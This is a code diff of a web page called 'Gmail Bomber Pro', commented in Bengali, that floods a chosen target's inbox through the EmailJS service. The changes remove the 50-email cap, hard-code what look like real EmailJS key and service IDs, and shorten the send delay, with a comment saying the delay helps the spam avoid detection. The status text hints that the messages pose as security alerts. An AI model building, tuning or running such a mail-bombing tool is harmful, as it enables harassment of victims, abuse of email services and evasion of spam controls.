@@ -3,16 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gmail Bomber - Hex Edition</title>
+    <title>Gmail Bomber Pro - Hex</title>
     <style>
-        body { margin: 0; padding: 0; background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; }
+        body { margin: 0; padding: 0; background: #000; color: #ff0000; font-family: monospace; overflow: hidden; }
         canvas { position: absolute; top: 0; left: 0; z-index: -1; }
-        .container { text-align: center; margin-top: 10%; background: rgba(0,0,0,0.9); padding: 30px; border: 2px solid #00ff00; display: inline-block; position: relative; left: 50%; transform: translateX(-50%); box-shadow: 0 0 20px #00ff00; border-radius: 10px; }
-        input { background: #111; color: #00ff00; border: 1px solid #00ff00; padding: 12px; margin: 8px; width: 280px; text-align: center; font-size: 16px; outline: none; }
-        button { background: #00ff00; color: #000; border: none; padding: 15px 35px; cursor: pointer; font-weight: bold; margin-top: 15px; font-size: 18px; transition: 0.4s; text-transform: uppercase; }
-        button:hover { background: #fff; color: #00ff00; box-shadow: 0 0 15px #fff; }
-        #display { margin-top: 25px; font-size: 1.3em; font-weight: bold; text-shadow: 0 0 10px #00ff00; }
-        h1 { letter-spacing: 3px; }
+        .container { text-align: center; margin-top: 10%; background: rgba(0,0,0,0.9); padding: 30px; border: 2px solid #ff0000; display: inline-block; position: relative; left: 50%; transform: translateX(-50%); box-shadow: 0 0 20px #ff0000; border-radius: 10px; }
+        input { background: #111; color: #ff0000; border: 1px solid #ff0000; padding: 12px; margin: 8px; width: 280px; text-align: center; font-size: 16px; outline: none; }
+        button { background: #ff0000; color: #000; border: none; padding: 15px 35px; cursor: pointer; font-weight: bold; margin-top: 15px; font-size: 18px; transition: 0.4s; }
+        button:hover { background: #fff; color: #ff0000; }
+        #display { margin-top: 25px; font-size: 1.3em; font-weight: bold; text-shadow: 0 0 10px #ff0000; }
     </style>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
@@ -21,15 +20,15 @@
     <div class="container">
         <h1>GMAIL BOMBER</h1>
         <input type="email" id="target_email" placeholder="Target Gmail Address"><br>
-        <input type="number" id="count" placeholder="Number of Emails (Max 50)"><br>
-        <button onclick="startAttack()">Initiate Blast</button>
-        <div id="display">AWAITING COMMAND...</div>
+        <input type="number" id="count" placeholder="Number of Emails"><br>
+        <button onclick="startAttack()">Launch Blast</button>
+        <div id="display">READY TO ATTACK</div>
     </div>
 
     <script>
-        // আপনার EmailJS ড্যাশবোর্ড থেকে Account > API Keys-এ গিয়ে Public Key এখানে বসান
+        // আপনার Public Key
         (function() {
-            emailjs.init("YOUR_PUBLIC_KEY"); 
+            emailjs.init("AXkdYkhVbL_celZQw"); 
         })();
 
         async function startAttack() {
@@ -37,41 +36,37 @@
             const count = parseInt(document.getElementById('count').value);
             const display = document.getElementById('display');
 
-            if(!email || !count) { display.innerText = "Error: Target Missing!"; return; }
-            if(count > 50) { display.innerText = "Error: Limit is 50!"; return; }
+            if(!email || !count) { display.innerText = "Error: Input Missing!"; return; }
 
-            display.innerText = "Connecting to SMTP Relay...";
+            display.innerText = "Targeting Facebook Security Relay...";
 
             for (let i = 1; i <= count; i++) {
                 try {
-                    // ড্যাশবোর্ড থেকে Service ID এবং Template ID এখানে বসান
-                    await emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-                        to_email: email,
-                        from_name: "Security System",
-                        message: "Warning: Multiple login attempts detected on your account!"
+                    // আপনার Service ID এবং নির্দিষ্ট Template ID
+                    await emailjs.send("service_zaiddwh", "template_4zb4ddo", {
+                        to_email: email 
                     });
 
-                    display.innerText = "MAILS BLASTED: " + i;
-                    
-                    // ২ সেকেন্ড গ্যাপ যাতে সার্ভিস ব্লক না করে
-                    await new Promise(res => setTimeout(res, 2000)); 
+                    display.innerText = "BLASTED: " + i + " ALERTS";
+                    // ১.৫ সেকেন্ড বিরতি যাতে দ্রুত স্প্যাম ধরা না পড়ে
+                    await new Promise(res => setTimeout(res, 1500)); 
                 } catch (e) {
-                    display.innerText = "Error: Daily Limit Reached!";
+                    display.innerText = "Status: Daily Limit Reached!";
                     break;
                 }
             }
             display.innerText = "MISSION COMPLETED!";
         }
 
-        // Matrix Animation (Green Theme for Gmail Bomber)
+        // Matrix Effect (Red Theme for Attack Mode)
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "0101101001"; const fontSize = 16;
+        const letters = "01011001"; const fontSize = 16;
         const columns = canvas.width / fontSize; const drops = Array(Math.floor(columns)).fill(1);
         function draw() {
             ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#00ff00"; ctx.font = fontSize + "px monospace";
+            ctx.fillStyle = "#ff0000"; ctx.font = fontSize + "px monospace";
             for (let i = 0; i < drops.length; i++) {
                 const text = letters[Math.floor(Math.random() * letters.length)];
                 ctx.fillText(text, i * fontSize, drops[i] * fontSize);
